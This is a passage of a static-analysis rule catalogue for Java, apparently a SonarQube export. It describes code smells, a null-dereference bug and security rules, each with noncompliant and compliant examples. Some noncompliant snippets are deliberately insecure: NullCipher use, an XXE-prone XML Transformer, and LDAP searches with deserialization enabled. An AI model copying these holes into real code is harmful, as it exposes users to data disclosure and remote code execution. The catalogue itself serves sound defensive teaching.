            "mdDesc": "<p>The <code>switch</code> statement should be used only to clearly define some new branches in the control flow. As soon as a <code>case</code>\nclause contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the\n<code>case</code> clause should be extracted into a dedicated method.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 5:</p>\n<pre>\nswitch (myVariable) {\n  case 0: // Noncompliant: 6 lines till next case\n    methodCall1(\"\");\n    methodCall2(\"\");\n    methodCall3(\"\");\n    methodCall4(\"\");\n    break;\n  case 1:\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (myVariable) {\n  case 0:\n    doSomething()\n    break;\n  case 1:\n  ...\n}\n...\nprivate void doSomething(){\n    methodCall1(\"\");\n    methodCall2(\"\");\n    methodCall3(\"\");\n    methodCall4(\"\");\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum number of lines",
                    "defaultValue": "5",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1150",
            "repo": "java",
            "name": "Enumeration should not be implemented",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>From the official Oracle Javadoc:</p>\n<blockquote>\n  <p>NOTE: The functionality of this Enumeration interface is duplicated by the Iterator interface. In addition, Iterator adds an optional remove\n  operation, and has shorter method names. New implementations should consider using Iterator in preference to Enumeration.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass implements Enumeration {  // Non-Compliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass implements Iterator {     // Compliant\n  /* ... */\n}\n</pre>",
            "mdDesc": "<p>From the official Oracle Javadoc:</p>\n<blockquote>\n  <p>NOTE: The functionality of this Enumeration interface is duplicated by the Iterator interface. In addition, Iterator adds an optional remove\n  operation, and has shorter method names. New implementations should consider using Iterator in preference to Enumeration.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass implements Enumeration {  // Non-Compliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass implements Iterator {     // Compliant\n  /* ... */\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "obsolete"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S923",
            "repo": "java",
            "name": "Functions should not be defined with a variable number of arguments",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>As stated per effective java : </p>\n<blockquote>\n  <p>Varargs methods are a convenient way to define methods that require a variable number of arguments, but they should not be overused. They can\n  produce confusing results if used inappropriately.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid fun ( String... strings )\t// Noncompliant\n{\n  // ...\n}\n</pre>",
            "mdDesc": "<p>As stated per effective java : </p>\n<blockquote>\n  <p>Varargs methods are a convenient way to define methods that require a variable number of arguments, but they should not be overused. They can\n  produce confusing results if used inappropriately.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid fun ( String... strings )\t// Noncompliant\n{\n  // ...\n}\n</pre>",
            "severity": "INFO",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2258",
            "repo": "java",
            "name": "\"javax.crypto.NullCipher\" should not be used for anything other than testing",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>By contract, the <code>NullCipher</code> class provides an \"identity cipher\" <del></del> one that does not transform or encrypt the plaintext in\nany way. As a consequence, the ciphertext is identical to the plaintext. So this class should be used for testing, and never in production code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nNullCipher nc = new NullCipher();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5547'>S5547</a> instead.</p>",
            "mdDesc": "<p>By contract, the <code>NullCipher</code> class provides an \"identity cipher\" <del></del> one that does not transform or encrypt the plaintext in\nany way. As a consequence, the ciphertext is identical to the plaintext. So this class should be used for testing, and never in production code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nNullCipher nc = new NullCipher();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S5547} instead.</p>",
            "severity": "BLOCKER",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S4435",
            "repo": "java",
            "name": "XML transformers should be secured",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>An XML External Entity or XSLT External Entity (XXE) vulnerability can occur when a <code>javax.xml.transform.Transformer</code> is created without\nenabling \"Secure Processing\" or when one is created without disabling resolving of both external DTDs and DTD entities. If that external data is being\ncontrolled by an attacker it may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the\nperspective of the machine where the parser is located, and other system impacts.</p>\n<p>This rule raises an issue when a <code>Transformer</code> is created without either of these settings.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nTransformer transformer = TransformerFactory.newInstance().newTransformer();\ntransformer.transform(input, result);\n</pre>\n<h2>Compliant Solution</h2>\n<p>Recommended:</p>\n<pre>\nTransformerFactory factory = TransformerFactory.newInstance();\nfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\nfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\n\nTransformer transformer = factory.newTransformer();\n\ntransformer.transform(input, result);\n</pre>\n<p>Implementation dependent:</p>\n<pre>\nTransformerFactory factory = TransformerFactory.newInstance();\nfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n\nTransformer transformer = factory.newTransformer();\n\ntransformer.transform(input, result);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)\">OWASP Top 10 2017 Category A4</a> - XML External Entities\n  (XXE) </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory\">OWASP XXE Cheat\n  Sheet</a> </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/611.html\">MITRE, CWE-611</a> - Improper Restriction of XML External Entity Reference ('XXE')\n  </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#XXE_DTD_TRANSFORM_FACTORY\">XXE_DTD_TRANSFORM_FACTORY</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#XXE_XSLT_TRANSFORM_FACTORY\">XXE_XSLT_TRANSFORM_FACTORY</a>\n  </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS2755'>S2755</a> instead.</p>",
            "mdDesc": "<p>An XML External Entity or XSLT External Entity (XXE) vulnerability can occur when a <code>javax.xml.transform.Transformer</code> is created without\nenabling \"Secure Processing\" or when one is created without disabling resolving of both external DTDs and DTD entities. If that external data is being\ncontrolled by an attacker it may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the\nperspective of the machine where the parser is located, and other system impacts.</p>\n<p>This rule raises an issue when a <code>Transformer</code> is created without either of these settings.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nTransformer transformer = TransformerFactory.newInstance().newTransformer();\ntransformer.transform(input, result);\n</pre>\n<h2>Compliant Solution</h2>\n<p>Recommended:</p>\n<pre>\nTransformerFactory factory = TransformerFactory.newInstance();\nfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\nfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\n\nTransformer transformer = factory.newTransformer();\n\ntransformer.transform(input, result);\n</pre>\n<p>Implementation dependent:</p>\n<pre>\nTransformerFactory factory = TransformerFactory.newInstance();\nfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n\nTransformer transformer = factory.newTransformer();\n\ntransformer.transform(input, result);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)\">OWASP Top 10 2017 Category A4</a> - XML External Entities\n  (XXE) </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory\">OWASP XXE Cheat\n  Sheet</a> </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/611.html\">MITRE, CWE-611</a> - Improper Restriction of XML External Entity Reference ('XXE')\n  </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#XXE_DTD_TRANSFORM_FACTORY\">XXE_DTD_TRANSFORM_FACTORY</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#XXE_XSLT_TRANSFORM_FACTORY\">XXE_XSLT_TRANSFORM_FACTORY</a>\n  </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S2755} instead.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1168",
            "repo": "java",
            "name": "Empty arrays and collections should be returned instead of null",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Returning <code>null</code> instead of an actual array or collection forces callers of the method to explicitly test for nullity, making them more\ncomplex and less readable.</p>\n<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static List&lt;Result&gt; getResults() {\n  return null;                             // Noncompliant\n}\n\npublic static Result[] getResults() {\n  return null;                             // Noncompliant\n}\n\npublic static void main(String[] args) {\n  Result[] results = getResults();\n\n  if (results != null) {                   // Nullity test required to prevent NPE\n    for (Result result: results) {\n      /* ... */\n    }\n  }\n}\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static List&lt;Result&gt; getResults() {\n  return Collections.emptyList();          // Compliant\n}\n\npublic static Result[] getResults() {\n  return new Result[0];\n}\n\npublic static void main(String[] args) {\n  for (Result result: getResults()) {\n    /* ... */\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aNYxBQ\">CERT, MSC19-C.</a> - For functions that return an array, prefer returning an empty array\n  over a null value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/JzZGBQ\">CERT, MET55-J.</a> - Return an empty array or collection instead of a null value for\n  methods that return an array or collection </li>\n</ul>",
            "mdDesc": "<p>Returning <code>null</code> instead of an actual array or collection forces callers of the method to explicitly test for nullity, making them more\ncomplex and less readable.</p>\n<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static List&lt;Result&gt; getResults() {\n  return null;                             // Noncompliant\n}\n\npublic static Result[] getResults() {\n  return null;                             // Noncompliant\n}\n\npublic static void main(String[] args) {\n  Result[] results = getResults();\n\n  if (results != null) {                   // Nullity test required to prevent NPE\n    for (Result result: results) {\n      /* ... */\n    }\n  }\n}\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static List&lt;Result&gt; getResults() {\n  return Collections.emptyList();          // Compliant\n}\n\npublic static Result[] getResults() {\n  return new Result[0];\n}\n\npublic static void main(String[] args) {\n  for (Result result: getResults()) {\n    /* ... */\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aNYxBQ\">CERT, MSC19-C.</a> - For functions that return an array, prefer returning an empty array\n  over a null value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/JzZGBQ\">CERT, MET55-J.</a> - Return an empty array or collection instead of a null value for\n  methods that return an array or collection </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2259",
            "repo": "java",
            "name": "Null pointers should not be dereferenced",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A reference to <code>null</code> should never be dereferenced/accessed. Doing so will cause a <code>NullPointerException</code> to be thrown. At\nbest, such an exception will cause abrupt program termination. At worst, it could expose debugging information that would be useful to an attacker, or\nit could allow an attacker to bypass security measures.</p>\n<p>Note that when they are present, this rule takes advantage of <code>@CheckForNull</code> and <code>@Nonnull</code> annotations defined in <a\nhref=\"https://jcp.org/en/jsr/detail?id=305\">JSR-305</a> to understand which values are and are not nullable except when <code>@Nonnull</code> is used\non the parameter to <code>equals</code>, which by contract should always work with null.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@CheckForNull\nString getName(){...}\n\npublic boolean isNameEmpty() {\n  return getName().length() == 0; // Noncompliant; the result of getName() could be null, but isn't null-checked\n}\n</pre>\n<pre>\nConnection conn = null;\nStatement stmt = null;\ntry{\n  conn = DriverManager.getConnection(DB_URL,USER,PASS);\n  stmt = conn.createStatement();\n  // ...\n\n}catch(Exception e){\n  e.printStackTrace();\n}finally{\n  stmt.close();   // Noncompliant; stmt could be null if an exception was thrown in the try{} block\n  conn.close();  // Noncompliant; conn could be null if an exception was thrown\n}\n</pre>\n<pre>\nprivate void merge(@Nonnull Color firstColor, @Nonnull Color secondColor){...}\n\npublic  void append(@CheckForNull Color color) {\n    merge(currentColor, color);  // Noncompliant; color should be null-checked because merge(...) doesn't accept nullable parameters\n}\n</pre>\n<pre>\nvoid paint(Color color) {\n  if(color == null) {\n    System.out.println(\"Unable to apply color \" + color.toString());  // Noncompliant; NullPointerException will be thrown\n    return;\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/476.html\">MITRE, CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/QdcxBQ\">CERT, EXP34-C.</a> - Do not dereference null pointers </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "mdDesc": "<p>A reference to <code>null</code> should never be dereferenced/accessed. Doing so will cause a <code>NullPointerException</code> to be thrown. At\nbest, such an exception will cause abrupt program termination. At worst, it could expose debugging information that would be useful to an attacker, or\nit could allow an attacker to bypass security measures.</p>\n<p>Note that when they are present, this rule takes advantage of <code>@CheckForNull</code> and <code>@Nonnull</code> annotations defined in <a\nhref=\"https://jcp.org/en/jsr/detail?id=305\">JSR-305</a> to understand which values are and are not nullable except when <code>@Nonnull</code> is used\non the parameter to <code>equals</code>, which by contract should always work with null.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@CheckForNull\nString getName(){...}\n\npublic boolean isNameEmpty() {\n  return getName().length() == 0; // Noncompliant; the result of getName() could be null, but isn't null-checked\n}\n</pre>\n<pre>\nConnection conn = null;\nStatement stmt = null;\ntry{\n  conn = DriverManager.getConnection(DB_URL,USER,PASS);\n  stmt = conn.createStatement();\n  // ...\n\n}catch(Exception e){\n  e.printStackTrace();\n}finally{\n  stmt.close();   // Noncompliant; stmt could be null if an exception was thrown in the try{} block\n  conn.close();  // Noncompliant; conn could be null if an exception was thrown\n}\n</pre>\n<pre>\nprivate void merge(@Nonnull Color firstColor, @Nonnull Color secondColor){...}\n\npublic  void append(@CheckForNull Color color) {\n    merge(currentColor, color);  // Noncompliant; color should be null-checked because merge(...) doesn't accept nullable parameters\n}\n</pre>\n<pre>\nvoid paint(Color color) {\n  if(color == null) {\n    System.out.println(\"Unable to apply color \" + color.toString());  // Noncompliant; NullPointerException will be thrown\n    return;\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/476.html\">MITRE, CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/QdcxBQ\">CERT, EXP34-C.</a> - Do not dereference null pointers </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4434",
            "repo": "java",
            "name": "LDAP deserialization should be disabled",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>JNDI supports the deserialization of objects from LDAP directories, which is fundamentally insecure and can lead to remote code execution.</p>\n<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            true, // Noncompliant; allows deserialization\n            deref));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            false,\n            deref));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf\">BlackHat\n  presentation</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING\">LDAP_ENTRY_POISONING</a> </li>\n</ul>",
            "mdDesc": "<p>JNDI supports the deserialization of objects from LDAP directories, which is fundamentally insecure and can lead to remote code execution.</p>\n<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            true, // Noncompliant; allows deserialization\n            deref));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            false,\n            deref));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf\">BlackHat\n  presentation</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING\">LDAP_ENTRY_POISONING</a> </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S2133",
            "repo": "java",
            "name": "Objects should not be created only to \"getClass\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Creating an object for the sole purpose of calling <code>getClass</code> on it is a waste of memory and cycles. Instead, simply use the class'\n<code>.class</code> property.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMyObject myOb = new MyObject();  // Noncompliant\nClass c = myOb.getClass();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nClass c = MyObject.class;\n</pre>",
            "mdDesc": "<p>Creating an object for the sole purpose of calling <code>getClass</code> on it is a waste of memory and cycles. Instead, simply use the class'\n<code>.class</code> property.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMyObject myOb = new MyObject();  // Noncompliant\nClass c = myOb.getClass();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nClass c = MyObject.class;\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2257",
            "repo": "java",
            "name": "Using non-standard cryptographic algorithms is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has\nbeen protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, ... should be used instead.</p>\n<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a standard algorithm instead of creating a custom one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class MyCryptographicAlgorithm extends MessageDigest {\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST\">MessageDigest is Custom</a>\n  </li>\n</ul>",
            "mdDesc": "<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has\nbeen protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, ... should be used instead.</p>\n<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a standard algorithm instead of creating a custom one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class MyCryptographicAlgorithm extends MessageDigest {\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST\">MessageDigest is Custom</a>\n  </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a3",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1d",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1d",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1d",
            "remFnType": "CONSTANT_ISSUE",
